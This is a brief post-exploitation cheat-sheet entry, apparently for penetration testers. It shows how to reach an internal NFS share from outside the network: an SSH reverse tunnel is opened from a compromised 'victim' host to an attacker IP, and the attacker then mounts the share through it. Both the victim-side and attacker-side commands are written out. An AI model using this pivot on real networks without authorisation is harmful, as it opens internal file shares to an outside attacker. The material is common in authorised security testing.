# Linux Post Methods

## Misc Tricks

* Mount internal NFS share through pivot:

```
# victim
ssh -R 2049:$target_nfs_ip:2049 proxyusr@$atk_ip
# attacker
mount -t nfs -o port=2049 localhost:/share /mnt
```
